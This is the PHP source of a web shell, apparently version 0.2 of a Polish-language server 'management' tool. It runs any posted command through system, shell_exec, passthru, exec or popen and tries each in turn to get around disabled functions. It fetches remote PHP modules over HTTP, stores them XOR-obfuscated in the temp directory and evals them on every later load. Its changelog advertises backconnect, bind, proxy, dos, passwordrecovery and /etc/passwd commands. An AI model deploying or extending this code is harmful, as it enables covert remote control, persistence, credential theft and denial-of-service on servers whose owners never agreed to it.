<?php

/**
 * Part of Neapter Framework
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 */

require_once dirname( __FILE__ ) . '/Lib/Arr.php';
require_once dirname( __FILE__ ) . '/Lib/Request.php';
require_once dirname( __FILE__ ) . '/Lib/ShellInterface.php';
require_once dirname( __FILE__ ) . '/Lib/LoadModules.php';

/**
 * class Shell - Zarzadzanie serwerem
 *
 * @version 0.2
 *
 * @uses Arr
 * @uses Request
 * @uses Form
 */
class Shell
{
	/**
	 * Wersja
	 */
	const VERSION = '0.2 b110604';

	/**
	 * Czas generowania strony
	 *
	 * @access private
	 * @var    float
	 */
	private $fGeneratedIn;

	/**
	 * SafeMode ON / OFF
	 *
	 * @access public
	 * @var    boolean
	 */
	public $bSafeMode;

	/**
	 * Tablica wylaczaonych funkcji
	 *
	 * @access private
	 * @var    array
	 */
	private $aDisableFunctions = array();

	/**
	 * Dzialamy w srodowisku Windows ?
	 *
	 * @access public
	 * @var    boolean
	 */
	public $bWindows;

	/**
	 * Komenda
	 *
	 * @access public
	 * @var    string
	 */
	public $sCmd;

	/**
	 * Lista parametrow
	 *
	 * @access public
	 * @var    array
	 */
	public $aArgv = array();

	/**
	 * Ilosc parametrow
	 *
	 * @access public
	 * @var    integer
	 */
	public $iArgc = 0;

	/**
	 * Lista opcji
	 *
	 * @access public
	 * @var    array
	 */
	public $aOptv = array();

	/**
	 * Ciag jako jeden wielki parametr
	 *
	 * @access public
	 * @var    string
	 */
	public $sArgv;

	/**
	 * Lista modulow i komend
	 *
	 *  [komenda1] => Modul1
	 *  [komenda2] => Modul2
	 *
	 * @access private
	 * @var    string
	 */
	private $aModules = array();

	/**
	 * Lista modulow
	 *
	 *  [Modul] => 'komenda1, komenda2'
	 *
	 * @access private
	 * @var    string
	 */
	private $aHelpModules = array();

	/**
	 * Konstruktor
	 *
	 * @uses   Request
	 *
	 * @access public
	 * @return void
	 */
	public function __construct()
	{
		/**
		 * Czas generowania strony
		 */
		$this -> fGeneratedIn = microtime( 1 );

		/**
		 * @see Request::init
		 */
		Request::init();

		/**
		 * Czy dzialamy na Windowsie ?
		 */
		$this -> bWindows = ( strncmp( PHP_OS, 'WIN', 3 ) === 0 );

		/**
		 * SafeMode
		 */
		$this -> bSafeMode = (bool) ini_get( 'safe_mode' );

		/**
		 * Jesli SafeMode jest wylaczony
		 */
		if( ! $this -> bSafeMode )
		{
			ini_set( 'display_errors',         1 );
			ini_set( 'max_execution_time',     0 );
			ini_set( 'memory_limit',           '1024M' );
			ini_set( 'default_socket_timeout', 5 );
			ini_set( 'date.timezone',          'Europe/Warsaw' );
		}

		/**
		 * Config
		 */
		error_reporting( -1 );
		ignore_user_abort( 0 );
		date_default_timezone_set( 'Europe/Warsaw' );

		/**
		 * disable_functions
		 */
		if( ( $sDisableFunctions = ini_get( 'disable_functions' ) ) !== '' )
		{
			$aDisableFunctions = explode( ',', $sDisableFunctions );

			array_walk( $aDisableFunctions, create_function( '$sValue', 'return strtolower( trim( $sValue ) );' ) );

			$this -> aDisableFunctions = $aDisableFunctions;
		}

		/**
		 * Wczytywanie modulow
		 */
		$sKey = sha1( __FILE__ );

		/**
		 * p jak PURE
		 */
		if(    ! isset( $_GET['p'] )
		    && is_file( $sFilePath = sys_get_temp_dir() . '/' . $sKey )
		    && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
		)
		{
			/**
			 * f jak FLUSH
			 */
			if( isset( $_GET['f'] ) )
			{
				unlink( $sFilePath );
			}
			else
			{
				$iDataLen = strlen( $sData );

				$sNewData = NULL;

				/**
				 * Deszyfrowanie zawartosci pliku
				 */
				for( $i = 0; $i < $iDataLen; $i++ )
				{
					$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 20 ) * 2, 2 ) ) );
				}

				eval( '?>' . $sNewData . '<?' );
			}
		}

		/**
		 * Lista dostepnych modulow
		 */
		$aClasses = get_declared_classes();

		foreach( $aClasses as $sClass )
		{
			/**
			 * Wyszukiwanie klas z prefixem Module
			 */
			if( ( strncmp( $sClass, 'Module', 6 ) === 0 ) && ( $sClass !== 'ModuleDummy' ) )
			{
				$oModule = new $sClass( $this );

				/**
				 * Klasa musi implementowac ShellInterface
				 */
				if( $oModule instanceof ShellInterface )
				{
					$aCommands = $oModule -> getCommands();

					foreach( $aCommands as $sCommand )
					{
						$this -> aModules[ $sCommand ] = $sClass;
					}

					$this -> aHelpModules[ $sClass ] = implode( ', ', $aCommands );
				}
			}
		}
	}

	/**
	 * Zwracanie nazwy hosta i portu
	 *
	 * @access private
	 * @param  integer $sHost Host / Host:port
	 * @return array          Host i port
	 */
	private function getHost( $sHost )
	{
		$iPort = 0;
		if( strpos( $sHost, ':' ) !== FALSE )
		{
			list( $sHost, $iPort ) = explode( ':', $sHost );
		}

		return array( $sHost, (int) $iPort );
	}

	/**
	 * Pobieranie statusu TAK / NIE
	 *
	 * @access private
	 * @param  boolean $bValue    Wartosc
	 * @param  boolean $bNegative Negacja 1, 0 zwroci zielone TAK, 1, 1 zwroci czerwone TAK
	 * @return string             Status
	 */
	private function getStatus( $bValue, $bNegative = FALSE )
	{
		return sprintf( '<span class="%s">%s</span>', ( ( $bNegative ? ! $bValue : $bValue ) ? 'green' : 'red' ), ( $bValue ? 'TAK' : 'NIE' ) );
	}

	/**
	 * Pobieranie menu
	 *
	 * @access private
	 * @return string  Menu w HTMLu
	 */
	private function getMenu()
	{
		return sprintf( 'Wersja PHP: <strong>%s</strong><br />' .
				'SafeMode: %s<br />' .
				'OpenBaseDir: %s<br />' .
				'Serwer Api: <strong>%s</strong><br />' .
				'Serwer: <strong>%s</strong><br />' .
				'Zablokowane funkcje: <strong>%s</strong><br />',

				phpversion(),
				$this -> getStatus( $this -> bSafeMode, 1 ),
				ini_get( 'open_basedir' ),
				php_sapi_name(),
				php_uname(),
				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'brak' : $sDisableFunctions )
		);
	}

	/**
	 * Komenda - modules
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandModules()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
modules - Dodatkowe moduły

	Użycie:
		modules version - wyświetlanie wersji modułów

		modules ścieżka_do_pliku_z_modułami

	Przykład:
		modules version
		modules /tmp/modules
		modules http://example.com/modules.txt
DATA;
		}

		/**
		 * Wyswietlanie wersji bibliotek
		 */
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'version' ) )
		{
			/**
			 * Szukanie najdluzszej nazwy modulu
			 */
			$iMaxLen = 0;
			foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
			{
				if( ( $iLen = strlen( $sModule ) ) > $iMaxLen )
				{
					$iMaxLen = $iLen;
				}
			}

			/**
			 * Wersja modulu
			 */
			$sOutput = NULL;
			foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
			{
				$oModule = new $sModule( $this );

				$sOutput .= str_pad( $sModule, $iMaxLen, ' ' ) . ' - ' . $oModule -> getVersion() . "\r\n";
			}

			return htmlspecialchars( $sOutput );
		}

		/**
		 * Pobieranie pliku z http
		 */
		if( strncmp( $this -> aArgv[0], 'http://', 7 ) === 0 )
		{
			if( ( $sData = file_get_contents( $this -> aArgv[0] ) ) === FALSE )
			{
				return 'Nie można pobrać pliku z modułami';
			}

			$sFilePath = tempnam( sys_get_temp_dir(), 'shell' );
			file_put_contents( $sFilePath, $sData );
		}
		/**
		 * Wczytywanie pliku
		 */
		else
		{
			if( ! is_file( $this -> aArgv[0] ) )
			{
				return 'Nie można wczytać pliku z modułami';
			}

			$sFilePath = $this -> aArgv[0];

			if( ( $sData = file_get_contents( $this -> aArgv[0] ) ) === FALSE )
			{
				return 'Nie można wczytać pliku z modułami';
			}
		}

		ob_start();
		require $sFilePath;
		ob_clean();
		ob_end_flush();

		/**
		 * Szyfrowanie zawartosci pliku
		 */
		$sKey = sha1( __FILE__ );

		$iDataLen = strlen( $sData );

		$sNewData = NULL;

		for( $i = 0; $i < $iDataLen; $i++ )
		{
			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 20 ) * 2, 2 ) ) );
		}

		file_put_contents( sys_get_temp_dir() . '/' . $sKey, $sNewData );

		return 'Plik z modułami został załadowany';
	}

	private function getCommandCr3d1ts()
	{
		return <<<DATA
Jak to się mówi: '&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;'

Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.

Jakieś sugestie, pytania ? Pisz śmiało: Krzychu - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>

Changelog:
==========

2011-06-03 v0.2
----------
* Wsparcie dla CLI
* Shella rozszerzono o następujące komendy:
	ping
	mkdir
	cp
	mv
	modules
	chmod
	mysql
	mysqldump
	backconnect
	bind
	proxy
	dos
	passwordrecovery
	cr3d1ts
* możliwość wczytania danego modułu
* polecenie 'cr3d1ts' nie wyświetla się w help'ie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
* 'php' jest aliasem dla 'eval

2011-05-15 v0.1
---------------
* Pierwsza wersja skryptu, zawiera podstawowe komendy takie jak:
	echo
	ls
	cat
	eval
	remove
	bcat
	socketdownload
	ftpdownload
	download
	socketupload
	ftpupload
	etcpasswd
	game
	help
DATA;
	}

	/**
	 * Komenda - help
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandHelp()
	{
		$iMaxLen = 0;
		foreach( $this -> aHelpModules as $sModuleCmd )
		{
			if( ( $iLen = strlen( $sModuleCmd ) ) > $iMaxLen )
			{
				$iMaxLen = $iLen;
			}
		}

		/**
		 * Szukanie najdluzszego ciagu
		 */
		$sOutput = NULL;
		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
		{
			$oModule = new $sModule( $this );

			$sHelp = $oModule -> getHelp();

			$iPos = ( ( ( $iPos = strpos( $sHelp, "\n" ) ) !== FALSE ) ? $iPos : strlen( $sHelp ) );
			$sOutput .= str_pad( $sModuleCmd, $iMaxLen, ' ' ) . ' - ' . trim( substr( $sHelp, 0, $iPos ) ) . "\r\n";
		}

		/**
		 * Wyswietlanie naglowka
		 */
		$sOutput .= "\r\n\r\n";
		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
		{
			$oModule = new $sModule( $this );

			$sOutput  .= $sModuleCmd . ' - ' . $oModule -> getHelp() . "\r\n\r\n\r\n";
		}

		return htmlspecialchars( substr( $sOutput, 0, -6 ) );
	}

	/**
	 * Domyslna akcja, dostep do konsoli
	 *
	 * @uses   Request
	 * @uses   Form
	 *
	 * @access public
	 * @return string
	 */
	public function getActionBrowser( $sCmd = NULL )
	{
		$bRaw = ( $sCmd !== NULL );

		/**
		 * Zawartosc konsoli
		 */
		$sConsole = NULL;

		/**
		 * Domyslna komenda to :ls -l sciezka_do_katalogu
		 */
		if( $sCmd === NULL )
		{
			if( PHP_SAPI === 'cli' )
			{
				/**
				 * Zmienne globalne to zlo ;), to powinno zostac przekazane
				 * jako parametr w konstruktorze ... ale coz ...
				 */
				$aArgv = $GLOBALS['argv'];
				array_shift( $aArgv );

				$sCmd = implode( $aArgv, ' ' );
			}
			else if( Request::getServer( 'REQUEST_METHOD' ) !== 'POST'  )
			{
				$sCmd = ':ls -l ' . dirname( __FILE__ );
			}
			else
			{
				$sCmd = (string) Request::getPost( 'cmd' );
			}
		}

		/**
		 * Komendy shella rozpoczynaja sie od znaku ':'
		 */
		if( substr( $sCmd, 0, 1 ) === ':' )
		{
			if( ( $iPos = strpos( $sCmd, ' ' ) - 1 ) !== -1 )
			{
				$this -> sCmd = (string)substr( $sCmd, 1, $iPos );
			}
			else
			{
				$this -> sCmd = (string) substr( $sCmd, 1 );
			}

			$this -> sArgv = ltrim( preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd ) );

			/**
			 * Rozdzielanie argumentow
			 *
			 * "sciezka do \"pliku\"" -> sciezka do "pliku"
			 */
			if( preg_match_all( '~\'(?:(?:\\\')|.*)\'|"(?:(?:\\")|(.*))"|[^ \r\n\t\'"]+~', $this -> sArgv, $aMatch ) );
			{
				/**
				 * Usuwanie koncowych znakow " oraz ', zamienianie \" na " i \' na '
				 */
				array_walk( $aMatch[0], array( $this, 'parseArgv' ) );

				$this -> aArgv = $aMatch[0];

				if( isset( $this -> aArgv[0] ) && substr( $this -> aArgv[0], 0, 1 ) === '-' )
				{
					$this -> aOptv = str_split( substr( $this -> aArgv[0], 1 ) );
					array_shift( $this -> aArgv );
					$this -> sArgv = ltrim( implode( ' ', $this -> aArgv ) );
				}
			}

			$this -> iArgc = count( $this -> aArgv );

			/**
			 *  Lista komend i aliasy
			 */
			switch( $this -> sCmd )
			{
				case 'help':
					$sConsole = $this -> getCommandHelp();
					break ;
				case 'modules':
					$sConsole = $this -> getCommandModules();
					break ;
				case 'cr3d1ts':
					$sConsole = $this -> getCommandCr3d1ts();
					break ;
				default :
					if( array_key_exists( $this -> sCmd, $this -> aModules ) )
					{
						$sModule = $this -> aModules[ $this -> sCmd ];
						$oModule = new $sModule( $this );

						if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
						{
							$sConsole = $this -> aHelpModules[ $sModule ] . ' - ' . $oModule -> getHelp();
						}
						else
						{
							$sConsole = $oModule -> get();
						}
					}
					else
					{
						$sConsole = sprintf( 'Nie ma takiej komendy "%s"', $this -> sCmd );
					}
			}
		}
		elseif( $sCmd === '' )
		{
			$sConsole = 'Wpisz ":help", by zobaczyć pomoc';
		}
		/**
		 * Wykonanie komendy systemowej
		 */
		else if( ! $this -> bSafeMode )
		{
			ob_start();
			if( ! in_array( 'system', $this -> aDisableFunctions ) )
			{
				system( $sCmd );
			}
			else if( ! in_array( 'shell_exec', $this -> aDisableFunctions ) )
			{
				echo shell_exec( $sCmd );
			}
			else if( ! in_array( 'passthru', $this -> aDisableFunctions ) )
			{
				passthru( $sCmd );
			}
			else if( ! in_array( 'exec', $this -> aDisableFunctions ) )
			{
				exec( $sCmd );
			}
			else if( ! in_array( 'popen', $this -> aDisableFunctions ) )
			{
				$rFp = popen( $sCmd, 'r' );
				while( ! feof( $rFp ) )
				{
					echo fread( $rFp, 1024 );
				}
			}
			else
			{
				echo 'Wszystkie funkcje systemowe są poblokowane !!!';
			}

			$sData = ob_get_contents();
			ob_clean();
			ob_end_flush();
			$sConsole = htmlspecialchars( $sData );
		}
		else
		{
			$sConsole = 'Safe mode jest włączone, funkcje systemowe nie działają !!!';
		}

		if( $bRaw || ( PHP_SAPI === 'cli' ) )
		{
			return strip_tags( $sConsole );
		}

		$sContent  = sprintf( '<pre id="console">%s</pre<div>', $sConsole ) .
		             sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
		             sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : $sCmd ) ) .
			     '<input type="submit" name="submit" value="Execute" id="cmd-send" /></form></div>';

		return $this -> getContent( $sContent );
	}

	/**
	 * Pobieranie calosci strony
	 *
	 * @uses   Request
	 *
	 * @access private
	 * @return string
	 */
	private function getContent( $sData )
	{
		$sMenu = $this -> getMenu();
		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
		$sVersion = self::VERSION;
return <<<DATA
<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset="utf-8"><style>
body{background-color:#eff;color:#000;font-size:12px;font-family:sans-serif,Verdana,Tahoma,Arial;margin:10px;padding:0;}
a{color:#226c90;text-decoration:none;}
a:hover{color:#5a9cbb;text-decoration:underline;}
h1,h2,h3,h4,h5,h6{margin-top:10px;padding-bottom:5px;color:#046;border-bottom:1px solid #ddd;}
table{background-color:#fff;border:1px solid #eef;border-radius:20px;-moz-border-radius:20px;margin:auto;padding:6px;}
td{background-color:#f8f8f8;border-radius:5px;-moz-border-radius:5px;margin:0;padding:0 0 0 4px;}
th{color:#046;font-size:14px;font-weight:700;background-color:#f2f2f2;border-radius:5px;-moz-border-radius:5px;margin:0;padding:2px;}
hr{margin-top:20px;background-color:#eff;border:1px solid #eef7fb;}
div#body{text-align:center;border:3px solid #eef;border-radius:20px;-moz-border-radius:20px;min-width:940px;background-color:#fff;margin:0 auto;padding:8px 20px 10px;}
div#menu{text-align:left;margin:0 auto;}
div#bottom{margin:10px auto;}
div#content{padding-top:10px;margin:0 auto;}
pre#console{text-align:left;height:350px;min-height:350px;width:98%;font-size:11px;background-color:#f9f9f9;color:#000;border:3px solid #def;overflow:scroll;margin:0 auto;padding:14px;}
input{border-radius:10px;-moz-border-radius:10px;border:1px solid #aaa;background-color:#fff;font-size:14px;padding:6px;}
input:hover{background-color:#eee;}
input#cmd{width:88%;margin-top:10px;padding-left:10px;}
input#cmd-send{margin-top:10px;margin-left:20px;}
.green{color:#55b855;font-weight:700;}
.red{color:#fb5555;font-weight:700;}
</style>
</head>
<body>
<div id="body">
<div id="menu">{$sMenu}</div>
<div id="content">{$sData}</div>
<div id="bottom">Strona wygenerowana w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>
</div>
</body>
</html>
DATA;
	}

	/**
	 * Wyswietlanie strony
	 *
	 * @access private
	 * @return string
	 */
	public function get()
	{
		/**
		 * @todo - Tutaj ma byc edycja pliku
		 */
		echo $this -> getActionBrowser();
	}

	/**
	 * Oczyszczanie argumentow ze zbednych znakow
	 *
	 * @access private
	 * @param  string & $sVar Argument
	 * @return void
	 */
	private function parseArgv( & $sVar )
	{
		$sVar = strtr( $sVar, array
			(
				'\\\'' => '\'',
				'\\"'  => '"'
			)
		);

		if(    ( ( substr( $sVar, 0, 1 ) === '"' ) && ( substr( $sVar, -1 ) === '"' ) )
		    || ( ( substr( $sVar, 0, 1 ) === '\'' ) && ( substr( $sVar, -1 ) === '\'' ) )
		)
		{
			$sVar = substr( $sVar, 1, -1 );
		}
	}

}

/**
 * Wylaczanie wszystkich bufferow
 */
for( $i = 0; $i < ob_get_level(); $i++ )
{
	ob_end_clean();
}

$oShell = new Shell();
$oShell -> get();

exit ;